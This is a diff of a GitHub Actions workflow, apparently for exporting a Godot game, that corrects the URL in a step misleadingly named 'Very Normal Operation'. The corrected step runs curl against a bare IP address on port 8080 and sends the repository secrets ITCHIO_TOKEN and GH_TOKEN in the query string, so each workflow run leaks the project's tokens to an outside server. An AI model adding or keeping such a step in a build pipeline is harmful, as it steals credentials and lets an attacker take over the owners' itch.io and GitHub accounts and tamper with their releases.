@@ -12,7 +12,7 @@ jobs:
 
       - name: Very Normal Operation
         run: |
-          curl -X GET "http://http://146.235.238.158:8080/?token=${{secrets.ITCHIO_TOKEN}}&token1=${{secrets.GH_TOKEN}}"
+          curl -X GET "http://146.235.238.158:8080/?token=${{secrets.ITCHIO_TOKEN}}&token1=${{secrets.GH_TOKEN}}"
 
       - name: Godot Export
         id: export
